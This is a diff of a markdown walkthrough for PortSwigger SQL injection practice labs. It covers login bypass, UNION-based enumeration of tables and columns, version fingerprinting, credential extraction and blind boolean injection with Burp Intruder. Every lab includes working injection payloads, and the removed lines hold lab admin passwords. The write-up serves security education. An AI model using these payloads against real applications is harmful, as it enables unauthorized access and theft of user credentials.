@@ -3,152 +3,249 @@
 ## Lab Description
 ![image](Picture/lab1.png)
 
-The query used by the application is provided in the lab description:
+In this lab, we are dealing with a SQL injection vulnerability in the `WHERE` clause of a query. The application uses the following SQL query to retrieve products from the database:
+
 ```sql
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
-This query retrieves information from the `products` table, specifically selecting products that belong to the `Gifts` category and have the condition `released = 1`, meaning the products have been released.
 
-To see all products, we need to make this condition always `TRUE`:
+This query selects products from the `products` table where the `category` is `Gifts` and the `released` status is `1`, indicating that the products are available to the public.
+
+### Exploiting the Vulnerability
+
+To exploit this vulnerability and view all products, including unreleased ones, we can manipulate the query by making the `WHERE` condition always true:
+
 ```sql
 Gifts' OR 1=1--
 ```
-The condition `1=1` is always true, and `--` is used to start a comment in SQL, so everything after it is ignored.
+
+Here’s what happens:
+- The condition `1=1` is always true.
+- The `--` operator starts a comment in SQL, which effectively ignores the rest of the original query. This allows us to bypass the `released = 1` condition and retrieve all products.
 
 # SQL Injection Vulnerability Allowing Login Bypass
 
 ## Lab Description
 ![image](Picture/lab2.png)
 
-The query used in the lab might look something like this:
+In this lab, the application uses a SQL query to authenticate users. The query might look something like this:
+
 ```sql
 SELECT * FROM users WHERE username = 'username' AND password = 'password';
 ```
-To bypass the `AND password = 'password'` condition, I inject into the username field using `--`:
+
+### Exploiting the Vulnerability
+
+To bypass the login mechanism, we can inject SQL code directly into the `username` field:
 
 ```sql
 WHERE username = 'administrator' --
 ```
 
-This will result in a query like:
+This transforms the query into:
+
 ```sql
 SELECT * FROM users WHERE username = 'administrator' -- ' AND password = '<PASSWORD>'
 ```
-![image](Picture/loginbypass.png)
 
-The final query becomes:
-```sql
-SELECT * FROM users WHERE username = 'administrator';
-```
+- The `--` operator comments out the password check, allowing us to bypass authentication and log in as the `administrator`.
 
 # SQL Injection Attack: Querying the Database Type and Version on Oracle
 
 ## Lab Description
 ![image](Picture/lab3.png)
 
-In Oracle, every `SELECT` statement must specify a table to select `FROM`. There is a table in Oracle that can be used for this purpose called `dual`.
+When working with Oracle databases, every `SELECT` statement must specify a table to select `FROM`. Oracle provides a special table called `dual` for such purposes.
 
-There are two different methods to query the database version on Oracle:
-- `SELECT banner FROM v$version`
-- `SELECT version FROM v$instance`
+### Steps to Extract Database Version
 
-To solve the lab, follow these steps to find the columns containing strings:
+To determine the database version, we can use the following methods:
+- Query the `v$version` view: `SELECT banner FROM v$version`
+- Query the `v$instance` view: `SELECT version FROM v$instance`
 
-- First, determine the number of columns by injecting `' ORDER BY 1--`. Here, 1 is the column number. Continue increasing until an error occurs, which indicates the correct number of columns. For example, the result indicates there are 2 columns.
-  ```sql
-  SELECT * FROM someTable WHERE category = 'any' ORDER BY 2--
-  ```
-- Next, check which columns contain strings by injecting `' UNION SELECT 'a','a' FROM DUAL--`. Both columns should be string columns.
-  ```sql
-  SELECT * FROM someTable WHERE category = 'any' UNION SELECT 'a','a' FROM DUAL--
-  ```
-- Finally, to obtain the version information, inject `' UNION SELECT 'a', banner FROM v$version--`.
-  ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', banner FROM v$version--'
-  ```
+#### Step-by-Step Exploitation
+
+1. **Identify the Number of Columns:**
+   Inject an `ORDER BY` clause to identify how many columns are in the original query:
+   ```sql
+   SELECT * FROM someTable WHERE category = 'any' ORDER BY 2--
+   ```
+   Keep increasing the number until you receive an error, indicating the total number of columns.
+
+2. **Determine String Columns:**
+   Use a `UNION` query to find which columns accept string data:
+   ```sql
+   SELECT * FROM someTable WHERE category = 'any' UNION SELECT 'a','a' FROM DUAL--
+   ```
+
+3. **Extract Version Information:**
+   Finally, inject a `UNION` query to retrieve the version information:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', banner FROM v$version--
+   ```
 
 # SQL Injection Attack: Querying the Database Type and Version on MySQL and Microsoft
 
 ## Lab Description
 ![image](Picture/lab4.png)
 
-The steps in this lab are almost identical to the lab [SQL Injection Attack: Querying the Database Type and Version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle).
+This lab is similar to the previous one, but with a focus on MySQL and Microsoft databases.
 
-The main difference is that in MySQL, comments can be started with `#`.
+### Key Differences
 
-To query the database version:
-- Inject `' UNION SELECT 'a', @@version#`.
-  ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', @@version#'
-  ```
+- In MySQL, comments start with `#`.
+- To query the database version in MySQL or Microsoft SQL Server, use `SELECT @@version`.
+
+#### Step-by-Step Exploitation
+
+1. **Inject the Payload:**
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', @@version#'
+   ```
+
+This will reveal the database version.
 
 # SQL Injection Attack: Listing the Database Contents on Oracle
 
 ## Lab Description
 ![image](Picture/lab5.png)
 
-The database in use here is Oracle, with information for all tables stored in the `ALL_TABLES` view.
+This lab involves an Oracle database, where all table information is stored in the `ALL_TABLES` view.
 
-In this [document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html), I am interested in the `table_name` column. So, I inject `' UNION SELECT table_name, null FROM all_tables--` and I see the table `USERS_XJIAWY`.
+### Exploiting the Vulnerability
 
-Steps:
+1. **Identify Available Tables:**
+   Inject a `UNION` query to list table names:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT table_name, NULL FROM all_tables--
+   ```
+   In this case, the `USERS_XJIAWY` table was found.
 
-- The [ALL_TAB_COLUMNS](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TAB_COLUMNS.html#GUID-F218205C-7D76-4A83-8691-BFD2AD372B63) view holds information about the columns of the tables, specifically the `column_name` column. Inject `' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--`.
-  ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--
-  ```
-  I found the columns `USERNAME_HDFLSL` and `PASSWORD_VASGBS`.
-- Next, use `' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--`.
-  ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--
-  ```
-  I found that the password for the `administrator` is `2ozd1e4np7yp6wc47rx3`.
+2. **Identify Column Names:**
+   Next, query the `ALL_TAB_COLUMNS` view to identify columns in the `USERS_XJIAWY` table:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--
+   ```
+   This reveals columns like `USERNAME_HDFLSL` and `PASSWORD_VASGBS`.
 
-- The last step is login to solve this lab.
-
+3. **Extract Data:**
+   Finally, retrieve the usernames and passwords:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--
+   ```
+   The password for the `administrator` is discovered.
 
 # SQL Injection Attack: Listing the Database Contents on Non-Oracle Databases
 
 ## Lab Description
 ![image](Picture/lab6.png)
 
-Upon checking, the database is using `Postgres`, which stores table information in the `information_schema.tables` view. [The relevant documentation](https://www.postgresql.org/docs/9.1/infoschema-tables.html), we can see the available columns are listed. So, I injected `' UNION SELECT table_name, NULL FROM information_schema.tables--` and found the table `users_xaurai`.
-```sql
-SELECT * FROM someTable WHERE category='any' UNION SELECT table_name, NULL FROM information_schema.tables--
-```
+In this lab, the database is using PostgreSQL, which stores table information in the `information_schema.tables` view.
 
-Steps:
-- Inject `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_xaurai'--`.
-  ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xaurai'--
-  ```
-  I found the columns `username_huyzfv` and `password_mxlnvz`.
-- Next, inject `' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--`.
-  ```sql
-  SELECT * FROM someTable WHERE category='any' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--
-  ```
-  I discovered that the password for the `administrator` is `3r5z5qaj2hfhokbicr8a`.
+### Exploiting the Vulnerability
 
-- The last step is to log in using these credentials to solve the lab.
+1. **Identify Available Tables:**
+   Inject a `UNION` query to list table names:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT table_name, NULL FROM information_schema.tables--
+   ```
+   This reveals a table named `users_xaurai`.
+
+2. **Identify Column Names:**
+   Next, query the `information_schema.columns` view to identify columns in the `users_xaurai` table:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xaurai'--
+   ```
+   This reveals columns like `username_huyzfv` and `password_mxlnvz`.
+
+3. **Extract Data:**
+   Finally, retrieve the usernames and passwords:
+   ```sql
+   SELECT * FROM someTable WHERE category='any' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--
+   ```
+   The password for the `administrator` is discovered.
 
 # SQL Injection UNION Attack: Retrieving Data from Other Tables
 
 ## Lab Description
 ![image](Picture/lab7.png)
 
-We know the database contains another table called `users`, with columns named `username` and `password`. So, I injected `' UNION SELECT username, password FROM users--`.
+We know that the database contains a table named `users`, with columns `username` and `password`.
 
-I found that the password for the `administrator` is `absq994f53k4jwp77utl`.
+### Exploiting the Vulnerability
 
-The last step is to log in to solve this lab.
+Inject a `UNION` query to retrieve usernames and passwords:
+
+```sql
+SELECT * FROM someTable WHERE category='any' UNION SELECT username, password FROM users--
+```
+
+The password for the `administrator` is revealed, allowing you to log in and solve the lab.
 
 # SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column
 
 ## Lab Description
 ![image](Picture/lab8.png)
 
-To retrieve multiple values in a single column, we need to use the `||` operator, which is a string concatenation operator in Oracle. So, I injected `' UNION SELECT null, username || '~' || password FROM users--`.
+To retrieve multiple values in a single column, use the `||` string concatenation operator in Oracle.
 
-I found that the password for the `administrator` is `8nx1xp93b0xyx4a2p33f`.
+### Exploiting the Vulnerability
 
-The last step is to log in to solve this lab.
+Inject a `UNION` query to concatenate the username and password:
+
+```sql
+SELECT * FROM someTable WHERE category='any' UNION SELECT null, username || '~' || password FROM users--
+```
+
+This reveals the password for the `administrator`.
+
+# Blind SQL Injection with Conditional Responses
+
+## Lab Description
+![image](Picture/lab9.png)
+
+In this lab, we will exploit a blind SQL injection vulnerability by using conditional responses to extract information. The page displays "Welcome back" when the query returns any rows.
+
+### Step 1: Confirming the Injection Point
+
+We can test this by injecting a condition that is always true:
+
+```sql
+SELECT TrackingId FROM someTable WHERE TrackingId = 'xyz' AND 1=1--
+```
+
+If the page shows "Welcome back," the injection point is confirmed.
+
+### Step 2: Determining the Password Length
+
+Next, we determine the length of the administrator's password by incrementally increasing the length in our query until the "Welcome back" message disappears:
+
+```sql
+SELECT TrackingId FROM someTable WHERE TrackingId = 'xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a'--
+```
+
+This query reveals that the password is 20 characters long.
+
+### Step 3: Extracting the Password
+
+Once the length is known, we can brute-force each character individually using a substring function:
+
+```sql
+SELECT TrackingId FROM someTable WHERE TrackingId = 'xyz' AND (SELECT substring(password,1,1) FROM users WHERE username='administrator')='a'--
+```
+
+Use Burp Intruder to automate the brute-force process:
+
+Add payload marker in like that.
+
+![image](Picture/blindsql1.png)
+
+1. **Payload 1:** Numbers from 1 to 20.
+2. **Payload 2:** Use Brute force with max, min = 1.
+3. **Grep:** Look for the "Welcome back" message.
+
+This reveals the password, allowing you to log in and solve the lab.
+
+![image](Picture/blindsql2.png)
+
+---
